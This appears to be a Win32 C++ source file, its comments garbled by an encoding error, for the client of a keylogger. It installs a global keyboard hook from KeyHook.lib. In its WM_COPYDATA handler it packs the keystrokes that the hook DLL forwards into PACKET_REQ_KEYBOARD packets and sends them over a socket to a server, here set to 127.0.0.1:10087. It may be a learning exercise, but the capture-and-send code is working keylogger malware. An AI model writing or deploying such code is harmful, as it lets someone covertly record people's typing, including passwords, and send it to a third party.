// TestWin32.cpp : ����Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "TestWin32.h"
#include <winsock2.h>

//�����Լ�д��ͷ�ļ����������һ�����������ڴ���Socket
#include "function.h"

//�����Լ�д��ͷ�ļ�������������ݰ���װ�ĸ�ʽ���ṹ�壩
#include "common.h"

//���������ⲿ����s����ͷ�ļ��е�s
extern SOCKET s;

//���߳���MySetHook��ʹ��λ��
#pragma comment(lib,"../../bin/KeyHook.lib")
BOOL MySetHook(HWND hWnd);

//���ھ��
HWND g_hWnd;




#define MAX_LOADSTRING 100

// ȫ�ֱ���: 
HINSTANCE hInst;                                // ��ǰʵ��
WCHAR szTitle[MAX_LOADSTRING];                  // �������ı�
WCHAR szWindowClass[MAX_LOADSTRING];            // ����������

// �˴���ģ���а����ĺ�����ǰ������: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

//WinMain �н���ĳ������ں���
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: �ڴ˷��ô��롣
	

	//����ͷ�ļ��еĺ�������Socket�������ӷ�����
	int nRet = InitSocket();
	if (nRet == 0) {
		OutputDebugStringA("init socket error");
		return 0;
	}

	
	sockaddr_in addr;
	int nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(10087);
	

	nRet = connect(s, (sockaddr*)&addr, nLength);
	if (SOCKET_ERROR == nRet) {
		return 0;
	}



    // ��ʼ��ȫ���ַ���
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_TESTWIN32, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // ִ��Ӧ�ó����ʼ��: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_TESTWIN32));

    MSG msg;

    // ����Ϣѭ��: 
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  ����: MyRegisterClass()
//
//  Ŀ��: ע�ᴰ���ࡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_TESTWIN32));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_TESTWIN32);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   ����: InitInstance(HINSTANCE, int)
//
//   Ŀ��: ����ʵ�����������������
//
//   ע��: 
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   //�������Ĵ��ھ����ֵ��ȫ�ִ��ھ����������������Ҳ�����øô��ھ��
   g_hWnd = hWnd;
   
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);


   //���ڴ�����ɺ��ٵ����¹�����
	   BOOL bRet = MySetHook(g_hWnd);
   if (!bRet) {
	   OutputDebugStringA("�¹�ʧ��");
	   return 0;
   }


   return TRUE;
}

//
//  ����: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��:    ���������ڵ���Ϣ��
//
//  WM_COMMAND  - ����Ӧ�ó���˵�
//  WM_PAINT    - ����������
//  WM_DESTROY  - �����˳���Ϣ������
//
//��Ӧ��Ӧ����Ϣ�ص�����
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_COPYDATA:{
		//���������dll���͹��������ݣ������д���
		PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
		//OutputDebugStringA((LPCSTR)(pcds->lpData));
		
		//ͨ��dll���յ���������pcds->lpData����
		const char* pStr = (const char*)pcds->lpData;

		//ͨ���׽�����Զ�Server����������
		char szBuf[256];	//�������ݰ�ʱ�򴴽�һ����������
		MyPacket* pPkt = (MyPacket*)szBuf;	//�Լ�д��ͷ�ļ�common.h���Լ���������ݰ���װ��ʽ�Ľṹ��
		pPkt->type = PACKET_REQ_KEYBOARD;
		pPkt->length = strlen(pStr) + 1;	//���ݰ�������Ϣ��������ͷ���ȣ���ָ���ݳ���
		memcpy(pPkt->data, pStr, strlen(pStr) + 1);	//�����ݿ���������
		send(
			s,
			(const char*)pPkt,	//���ͷ�װ�õİ�
			//pPkt->length + sizeof(unsigned int) * 2,	//���ݳ���+��ͷ����
			255,
			0
		);


	}
	 break;


    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // �����˵�ѡ��: 
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;

    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: �ڴ˴�����ʹ�� hdc ���κλ�ͼ����...
            EndPaint(hWnd, &ps);
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// �����ڡ������Ϣ��������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}